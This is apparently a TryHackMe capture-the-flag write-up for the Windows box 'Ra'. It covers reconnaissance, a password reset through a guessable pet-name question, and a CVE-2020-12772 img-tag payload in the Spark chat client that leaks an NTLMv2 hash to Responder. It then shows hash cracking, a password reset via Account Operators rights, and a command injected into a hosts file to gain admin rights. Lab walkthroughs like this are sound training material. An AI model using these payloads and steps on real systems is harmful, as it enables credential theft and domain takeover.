> Ra | Windows

# Nmap

nmap -sC -sV -T4 -Pn -vv -A -p- -oN nmap/initial windcorp.thm

```bash
53/tcp    open  domain              syn-ack Simple DNS Plus
80/tcp    open  http                syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Windcorp.
88/tcp    open  kerberos-sec        syn-ack Microsoft Windows Kerberos (server time: 2021-06-10 14:46:23Z)
135/tcp   open  msrpc               syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn         syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap                syn-ack Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?       syn-ack
464/tcp   open  kpasswd5?           syn-ack
593/tcp   open  ncacn_http          syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped          syn-ack
3268/tcp  open  ldap                syn-ack Microsoft Windows Active Directory LDAP (Domain: windcorp.thm0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped          syn-ack
5222/tcp  open  jabber              syn-ack
5223/tcp  open  ssl/hpvirtgrp?      syn-ack
5229/tcp  open  jaxflow?            syn-ack
5262/tcp  open  jabber              syn-ack
5270/tcp  open  ssl/xmp?            syn-ack
5275/tcp  open  jabber              syn-ack
5276/tcp  open  ssl/unknown         syn-ack
5985/tcp  open  http                syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7443/tcp  open  ssl/http            syn-ack Jetty 9.4.18.v20190429
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Jetty(9.4.18.v20190429)
|_http-title: Openfire HTTP Binding Service
| ssl-cert: Subject: commonName=fire.windcorp.thm
| Subject Alternative Name: DNS:fire.windcorp.thm, DNS:*.fire.windcorp.thm
| Issuer: commonName=fire.windcorp.thm
9091/tcp  open  ssl/xmltec-xmlmail? syn-ack
9389/tcp  open  mc-nmf              syn-ack .NET Message Framing
49670/tcp open  msrpc               syn-ack Microsoft Windows RPC
49674/tcp open  ncacn_http          syn-ack Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc               syn-ack Microsoft Windows RPC
49676/tcp open  msrpc               syn-ack Microsoft Windows RPC
49696/tcp open  msrpc               syn-ack Microsoft Windows RPC
```

Once looking at the website we can find a reset password button .But before that we have to have am usename. Scrolling down we have a list of users. I tried to login to SMB Anonymously but nothing showed up. So as I was inspecting the usernames I came to look at an image `img/lilyleAndSparky.jpg` and a dog in it with quotes `I love being able to bring my best friend to work with me!.` Also while clicking at the Reset Password button it asks for certain question and on of them is `What is ur 1st pet name` and we have `Sparky` the dog. So we can reset lilye's password. And yes we can change that!

We are prompted a message 

```
Your password has been reset to: ChangeMe#1234
Remember to change it after logging in! 
```

But where can we use that password. Let's start with SMB.

crackmapexec smb windcorp.thm -u lilyle -p ChangeMe#1234

```bash
SMB         10.10.245.33    445    FIRE             [+] windcorp.thm\lilyle:ChangeMe#1234
```

smbmap -u lilyle -p ChangeMe#1234 -R -H windcorp.thm

And I can locate Flag1.txt in /shared. smbclient //windcorp.thm/Shared -U lilyle

# Flag 1.txt

```
THM{466d52dc75a277d6c3f6c6fcbc716d6b62420f48}
```

And we got another interesting file named Spark. Let's get that one too! And let's install it `sudo dpkg -i spark_2_8_3.deb`. Now running `spark` gives us the UI. But spark is Open Source and looks outdated too! Let's login but before that we have to accept all certificates and disable hostname verification in Advanced Option.

Wow!! We got an exploit too!`CVE-2020-12772`.

# Steps

1. We have to be authenticated. We are.
2. We have to chat with someone. And while looking at the users name we got only 1 user with green symbol looks like he is online.

```
<a href="xmpp:buse@fire.windcorp.thm">Buse Candan</a>
```

3. Start a chat with Buse.
4. Attach the payload `Hi! <img src="http://10.9.12.130/image.jpg">` and have Responder ready.
5. We got buse's hash.

```bash
[HTTP] NTLMv2 Client   : 10.10.59.82
[HTTP] NTLMv2 Username : WINDCORP\buse
[HTTP] NTLMv2 Hash     : buse::WINDCORP:1122334455667788:0E7B864FFF568D6FD5C4AD44E94DA64F:0101000000000000A789F77A555FD701F6980EAE22378868000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000800300030000000000000000100000000200000A960785542E722B5B1E65BA17D220D19BAD90E4F9BA7CE2ABA0343A5EA1ED1FC0A00100000000000000000000000000000000000090000000000000000000000
```

Let's crack using Hashcat

hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force

`uzunLM+3131`

Since WinRM is open let's try it!

./evil-winrm.rb -i windcorp.thm -u buse -p uzunLM+3131

We are in as buse.

# Flag 2.txt

```
THM{6f690fc72b9ae8dc25a24a104ed804ad06c7c9b1}
```

While looking around we can find `C:\scripts` and we have a file name `checkserver.ps`. Checking it we can find that it is reading hostnames from `C:\Users\brittanycr\hosts.txt` but we don't have permission to read it.

whomai /groups

```
Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Account Operators                   Alias            S-1-5-32-548                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users                Alias            S-1-5-32-555                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
WINDCORP\IT                                 Group            S-1-5-21-555431066-3599073733-176599750-5865 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
```

Account Operators group grants limited account creation privileges to a user. This can essentially create and manage users and groups in the domain, including its own membership and that of the Server Operators group. So let's change brittanycr's password. But we have to meet the AD password policy.

Get-ADDefaultDomainPasswordPolicy

```bash
ComplexityEnabled           : True
DistinguishedName           : DC=windcorp,DC=thm
LockoutDuration             : 00:02:00
LockoutObservationWindow    : 00:02:00
LockoutThreshold            : 5
MaxPasswordAge              : 42.00:00:00
MinPasswordAge              : 1.00:00:00
MinPasswordLength           : 7
objectClass                 : {domainDNS}
objectGuid                  : 3fba0196-bc8f-44f2-8b8f-ecb8698a7c22
PasswordHistoryCount        : 24
ReversibleEncryptionEnabled : True
```

net user /domain brittanycr NoobMaster123

Let's login through SMB and get the hosts file now.

smbclient  \\\\windcorp.thm\\Users -U brittanycr

```bash
cd brittanycr
GET hosts.txt
```

## hosts.txt

```
google.com
cisco.com
```

Let's try to create a user to admin group.

```
net user ghandi CyberGoat1234 /add
The command completed successfully.
net localgroup Administrators ghandi /add
net.exe : System error 5 has occurred.
    + CategoryInfo          : NotSpecified: (System error 5 has occurred.:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
```

So we can't add the user to admin group. Let's put the command in the hosts.txt file.

```
google.com
notadomain.ru; net localgroup Administrators ghandi /add
```

./evil-winrm.rb -i windcorp.thm -u ghandi -p CyberGoat1234

We are in as ghandi.

# Flag 3.txt

```
THM{ba3a2bff2e535b514ad760c283890faae54ac2ef}
```